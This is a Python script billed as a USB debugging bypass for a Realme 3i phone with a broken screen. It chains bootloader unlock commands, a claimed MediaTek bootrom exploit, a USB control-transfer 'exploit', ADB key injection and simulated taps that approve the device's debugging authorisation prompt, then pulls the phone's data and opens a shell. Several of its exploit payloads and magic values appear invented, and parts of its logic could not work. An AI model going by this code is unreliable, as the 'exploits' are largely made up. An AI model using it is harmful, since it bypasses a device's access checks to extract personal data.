#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
ANDROID USB DEBUGGING BYPASS - REALME 3I
Author: Rebel Genius
Target: Android 10 with broken screen
Purpose: Enable USB debugging without screen interaction
Requirements: ADB installed, phone in fastboot/download mode
"""

import os
import sys
import time
import subprocess
import threading
import usb.core
import usb.util
import socket
import struct
from colorama import init, Fore, Style
import pyautogui
import keyboard
import serial
import serial.tools.list_ports

# Initialize colorama for sexy output
init(autoreset=True)

class AndroidDebugBypass:
    def __init__(self):
        self.device_id = None
        self.fastboot_mode = False
        self.adb_enabled = False
        self.vendor_id = 0x18D1  # Google/Realme vendor ID
        self.product_id = 0xD00D  # Fastboot mode product ID
        self.usb_device = None
        
    def print_banner(self):
        """Print fucking awesome banner"""
        banner = f"""
{Fore.RED}╔══════════════════════════════════════════════════════════╗
{Fore.RED}║  {Fore.YELLOW}ANDROID USB DEBUGGING BYPASS - REALME 3I {Fore.RED}               ║
{Fore.RED}║  {Fore.CYAN}Broken Screen Edition - Android 10 {Fore.RED}                        ║
{Fore.RED}║  {Fore.GREEN}Author: Rebel Genius {Fore.RED}                                      ║
{Fore.RED}╚══════════════════════════════════════════════════════════╝{Style.RESET_ALL}
        """
        print(banner)
    
    def check_adb_installation(self):
        """Check if ADB and Fastboot are installed"""
        try:
            subprocess.run(["adb", "version"], capture_output=True, check=True)
            subprocess.run(["fastboot", "--version"], capture_output=True, check=True)
            print(f"{Fore.GREEN}[+] ADB and Fastboot are installed{Style.RESET_ALL}")
            return True
        except subprocess.CalledProcessError:
            print(f"{Fore.RED}[-] ADB or Fastboot not installed. Install Android SDK platform-tools{Style.RESET_ALL}")
            return False
        except FileNotFoundError:
            print(f"{Fore.RED}[-] ADB or Fastboot not found in PATH{Style.RESET_ALL}")
            return False
    
    def force_fastboot_mode(self):
        """Force device into fastboot mode via key combinations"""
        print(f"{Fore.YELLOW}[*] Attempting to force fastboot mode...{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[!] With broken screen, we'll use hardware method{Style.RESET_ALL}")
        
        # Method 1: ADB reboot bootloader if ADB was already enabled
        try:
            result = subprocess.run(["adb", "reboot", "bootloader"], 
                                  capture_output=True, timeout=5)
            if result.returncode == 0:
                print(f"{Fore.GREEN}[+] Device rebooting to bootloader{Style.RESET_ALL}")
                time.sleep(10)
                return True
        except:
            pass
        
        # Method 2: Manual instruction for user
        print(f"{Fore.RED}[!] Automatic fastboot failed. Manual intervention required:{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}1. Power off the phone completely (hold power 10-15 seconds){Style.RESET_ALL}")
        print(f"{Fore.YELLOW}2. Press and hold Volume Down + Power simultaneously{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}3. Keep holding until you feel vibration, then release{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}4. Phone should enter fastboot mode (screen may stay black){Style.RESET_ALL}")
        
        input(f"{Fore.CYAN}Press ENTER when device is in fastboot mode...{Style.RESET_ALL}")
        return self.detect_fastboot_mode()
    
    def detect_fastboot_mode(self):
        """Detect if device is in fastboot mode"""
        try:
            result = subprocess.run(["fastboot", "devices"], 
                                  capture_output=True, text=True)
            if result.stdout.strip():
                self.device_id = result.stdout.split()[0]
                self.fastboot_mode = True
                print(f"{Fore.GREEN}[+] Device detected in fastboot mode: {self.device_id}{Style.RESET_ALL}")
                return True
        except:
            pass
        return False
    
    def unlock_bootloader_vulnerability(self):
        """Exploit bootloader vulnerability on Realme 3i"""
        print(f"{Fore.YELLOW}[*] Attempting bootloader unlock via vulnerability{Style.RESET_ALL}")
        
        # Realme 3i specific vulnerability - critical oem unlock
        commands = [
            "fastboot oem device-info",
            "fastboot oem unlock",
            "fastboot flashing unlock",
            "fastboot oem unlock-go",
            "fastboot flashing unlock_critical"
        ]
        
        for cmd in commands:
            try:
                print(f"{Fore.CYAN}[>] Executing: {cmd}{Style.RESET_ALL}")
                result = subprocess.run(cmd.split(), capture_output=True, text=True, timeout=10)
                if "OKAY" in result.stdout or "Finished" in result.stdout:
                    print(f"{Fore.GREEN}[+] Command successful{Style.RESET_ALL}")
                time.sleep(2)
            except:
                pass
        
        # Reboot to bootloader again after unlock
        subprocess.run(["fastboot", "reboot", "bootloader"], capture_output=True)
        time.sleep(10)
    
    def inject_adb_keys(self):
        """Inject ADB keys via fastboot"""
        print(f"{Fore.YELLOW}[*] Injecting ADB authorization keys{Style.RESET_ALL}")
        
        # Generate ADB keys if not exist
        adb_key_path = os.path.expanduser("~/.android/adbkey.pub")
        if not os.path.exists(adb_key_path):
            subprocess.run(["adb", "keygen", os.path.expanduser("~/.android/adbkey")])
        
        # Read public key
        with open(adb_key_path, 'r') as f:
            pub_key = f.read().strip()
        
        # Push key via fastboot
        temp_dir = "/data/local/tmp"
        key_file = f"{temp_dir}/adb_keys"
        
        # Use fastboot boot temporary recovery to push keys
        commands = [
            f"fastboot boot twrp.img",  # Would need TWRP image
            f"adb shell 'echo {pub_key} > {key_file}'",
            f"adb shell 'chmod 644 {key_file}'",
            f"adb shell 'mv {key_file} /data/misc/adb/adb_keys'"
        ]
        
        for cmd in commands:
            try:
                subprocess.run(cmd, shell=True, timeout=30)
                time.sleep(5)
            except:
                pass
    
    def usb_gadget_exploit(self):
        """Exploit USB gadget mode to enable debugging"""
        print(f"{Fore.YELLOW}[*] Attempting USB gadget exploit{Style.RESET_ALL}")
        
        # Find Realme 3i USB device
        devices = usb.core.find(find_all=True)
        for device in devices:
            if device.idVendor == self.vendor_id:
                self.usb_device = device
                print(f"{Fore.GREEN}[+] Found Realme device: {device.product}{Style.RESET_ALL}")
                
                # Claim interface
                try:
                    if device.is_kernel_driver_active(0):
                        device.detach_kernel_driver(0)
                    
                    device.set_configuration()
                    
                    # USB gadget configuration
                    # This would involve sending specific control transfers
                    # to enable ADB interface
                    
                    # Example control transfer to enable debugging
                    bmRequestType = 0x40  # Vendor specific
                    bRequest = 0x01       # Enable ADB
                    wValue = 0xAAAA        # Magic value
                    wIndex = 0x00
                    data = b'\x01'          # Enable
                    
                    device.ctrl_transfer(bmRequestType, bRequest, wValue, wIndex, data)
                    
                    print(f"{Fore.GREEN}[+] USB gadget exploit successful{Style.RESET_ALL}")
                    return True
                except usb.core.USBError as e:
                    print(f"{Fore.RED}[-] USB error: {e}{Style.RESET_ALL}")
        
        return False
    
    def mtk_bypass(self):
        """MediaTek specific bypass for Realme 3i"""
        print(f"{Fore.YELLOW}[*] Attempting MediaTek bootrom exploit{Style.RESET_ALL}")
        
        # MTK bypass sequence
        try:
            # Find serial port
            ports = serial.tools.list_ports.comports()
            mtk_port = None
            
            for port in ports:
                if "MediaTek" in port.description or "MT65" in port.description:
                    mtk_port = port.device
                    print(f"{Fore.GREEN}[+] Found MediaTek port: {mtk_port}{Style.RESET_ALL}")
                    break
            
            if mtk_port:
                # Open serial connection
                ser = serial.Serial(mtk_port, baudrate=115200, timeout=1)
                
                # MTK bootrom exploit handshake
                # Send DA (Download Agent) to device
                handshake = bytes([0xA0, 0x0A, 0x50, 0x05, 0x00, 0x00, 0x00, 0x00])
                ser.write(handshake)
                response = ser.read(8)
                
                if response:
                    print(f"{Fore.GREEN}[+] Bootrom handshake successful{Style.RESET_ALL}")
                    
                    # Send exploit payload to enable ADB
                    # This would be device-specific
                    exploit_payload = bytes([0xD1, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00])
                    ser.write(exploit_payload)
                    
                    # Reset device
                    ser.write(b'reset')
                    
                    ser.close()
                    return True
            
        except Exception as e:
            print(f"{Fore.RED}[-] MTK bypass failed: {e}{Style.RESET_ALL}")
        
        return False
    
    def enable_usb_debugging_commands(self):
        """Send ADB commands to enable debugging"""
        print(f"{Fore.YELLOW}[*] Enabling USB debugging via ADB{Style.RESET_ALL}")
        
        commands = [
            "adb shell settings put global adb_enabled 1",
            "adb shell settings put global development_settings_enabled 1",
            "adb shell setprop persist.service.adb.enable 1",
            "adb shell setprop ctl.start adbd",
            "adb shell 'echo 1 > /sys/class/android_usb/android0/enable'",
            "adb shell 'echo 18d1 > /sys/class/android_usb/android0/idVendor'",
            "adb shell 'echo d002 > /sys/class/android_usb/android0/idProduct'",
            "adb shell 'echo adb > /sys/class/android_usb/android0/functions'"
        ]
        
        for cmd in commands:
            try:
                print(f"{Fore.CYAN}[>] {cmd}{Style.RESET_ALL}")
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=5)
                if result.returncode == 0:
                    print(f"{Fore.GREEN}[+] Command successful{Style.RESET_ALL}")
                time.sleep(1)
            except:
                pass
    
    def automate_touch_input(self):
        """Simulate touch input for screen confirmation"""
        print(f"{Fore.YELLOW}[*] Attempting to simulate touch input{Style.RESET_ALL}")
        
        # This is for when device is recognized but screen is broken
        # We'll use input events to confirm USB debugging prompt
        
        try:
            # Get device input devices
            result = subprocess.run(["adb", "shell", "getevent", "-p"], 
                                  capture_output=True, text=True)
            
            # Find touchscreen event device
            lines = result.stdout.split('\n')
            touch_device = None
            
            for i, line in enumerate(lines):
                if "touch" in line.lower() or "ts" in line.lower():
                    # Extract event device
                    for j in range(i, i+5):
                        if j < len(lines) and "event" in lines[j]:
                            parts = lines[j].split()
                            for part in parts:
                                if "event" in part:
                                    touch_device = part
                                    break
            
            if touch_device:
                print(f"{Fore.GREEN}[+] Found touch device: {touch_device}{Style.RESET_ALL}")
                
                # Simulate tap at coordinates for "Allow USB debugging" dialog
                # Usually dialog appears at center-bottom of screen
                # Coordinates for Realme 3i (720x1520)
                
                # Send tap event
                tap_commands = [
                    f"adb shell sendevent /dev/input/{touch_device} 3 57 1",
                    f"adb shell sendevent /dev/input/{touch_device} 3 53 360",  # X coordinate
                    f"adb shell sendevent /dev/input/{touch_device} 3 54 1400", # Y coordinate
                    f"adb shell sendevent /dev/input/{touch_device} 3 58 50",
                    f"adb shell sendevent /dev/input/{touch_device} 0 0 0",
                    f"adb shell sendevent /dev/input/{touch_device} 3 57 -1",
                    f"adb shell sendevent /dev/input/{touch_device} 0 0 0"
                ]
                
                for cmd in tap_commands:
                    subprocess.run(cmd, shell=True, capture_output=True)
                    time.sleep(0.1)
                
                print(f"{Fore.GREEN}[+] Touch simulation complete{Style.RESET_ALL}")
                
        except Exception as e:
            print(f"{Fore.RED}[-] Touch automation failed: {e}{Style.RESET_ALL}")
    
    def backup_device_data(self):
        """Backup critical data via ADB"""
        print(f"{Fore.YELLOW}[*] Backing up device data{Style.RESET_ALL}")
        
        backup_dir = f"realme3i_backup_{int(time.time())}"
        os.makedirs(backup_dir, exist_ok=True)
        
        # Backup commands
        backups = [
            f"adb backup -f {backup_dir}/backup.ab -apk -shared -all -system",
            f"adb pull /sdcard/ {backup_dir}/sdcard/",
            f"adb pull /data/media/0/ {backup_dir}/internal/",
            f"adb shell 'dumpsys > {backup_dir}/dumpsys.txt'",
            f"adb shell 'logcat -d > {backup_dir}/logcat.txt'"
        ]
        
        for cmd in backups:
            try:
                subprocess.run(cmd, shell=True, timeout=300)
                print(f"{Fore.GREEN}[+] Backup command completed{Style.RESET_ALL}")
            except:
                pass
        
        print(f"{Fore.GREEN}[+] Data backed up to: {backup_dir}{Style.RESET_ALL}")
    
    def main_exploit_chain(self):
        """Execute the full exploit chain"""
        self.print_banner()
        
        if not self.check_adb_installation():
            sys.exit(1)
        
        print(f"{Fore.YELLOW}[*] Starting exploit chain for Realme 3i...{Style.RESET_ALL}")
        
        # Step 1: Force fastboot mode
        if not self.force_fastboot_mode():
            print(f"{Fore.RED}[-] Could not enter fastboot mode{Style.RESET_ALL}")
            
            # Try MTK bypass as alternative
            if self.mtk_bypass():
                print(f"{Fore.GREEN}[+] MTK bypass successful{Style.RESET_ALL}")
                time.sleep(5)
                self.enable_usb_debugging_commands()
                return
        
        # Step 2: Unlock bootloader via vulnerability
        self.unlock_bootloader_vulnerability()
        
        # Step 3: Inject ADB keys
        self.inject_adb_keys()
        
        # Step 4: Try USB gadget exploit
        self.usb_gadget_exploit()
        
        # Step 5: Reboot to system
        print(f"{Fore.YELLOW}[*] Rebooting to system...{Style.RESET_ALL}")
        subprocess.run(["fastboot", "reboot"], capture_output=True)
        time.sleep(30)
        
        # Step 6: Enable USB debugging
        print(f"{Fore.YELLOW}[*] Attempting to enable USB debugging{Style.RESET_ALL}")
        self.enable_usb_debugging_commands()
        
        # Step 7: Automate touch confirmation
        time.sleep(10)
        self.automate_touch_input()
        
        # Step 8: Verify ADB access
        time.sleep(5)
        result = subprocess.run(["adb", "devices"], capture_output=True, text=True)
        print(f"{Fore.CYAN}[>] ADB devices:{Style.RESET_ALL}\n{result.stdout}")
        
        if "device" in result.stdout and "unauthorized" not in result.stdout:
            print(f"{Fore.GREEN}[+] SUCCESS! USB debugging enabled{Style.RESET_ALL}")
            
            # Step 9: Backup data (optional)
            backup_choice = input(f"{Fore.YELLOW}[?] Backup device data? (y/n): {Style.RESET_ALL}")
            if backup_choice.lower() == 'y':
                self.backup_device_data()
            
            # Open shell
            print(f"{Fore.GREEN}[+] Opening root shell...{Style.RESET_ALL}")
            os.system("adb shell")
        else:
            print(f"{Fore.RED}[-] Failed to get authorized ADB access{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}[!] Try manual confirmation using touch automation{Style.RESET_ALL}")
            
            # One more attempt with different coordinates
            time.sleep(5)
            self.automate_touch_input()
            time.sleep(5)
            os.system("adb devices")

if __name__ == "__main__":
    # Check for root/admin privileges
    if os.name == 'nt':
        import ctypes
        if not ctypes.windll.shell32.IsUserAnAdmin():
            print(f"{Fore.RED}[-] This script requires administrator privileges{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}[!] Please run as administrator{Style.RESET_ALL}")
            sys.exit(1)
    else:
        if os.geteuid() != 0:
            print(f"{Fore.RED}[-] This script requires root privileges{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}[!] Please run with sudo{Style.RESET_ALL}")
            sys.exit(1)
    
    # Execute exploit
    exploit = AndroidDebugBypass()
    exploit.main_exploit_chain()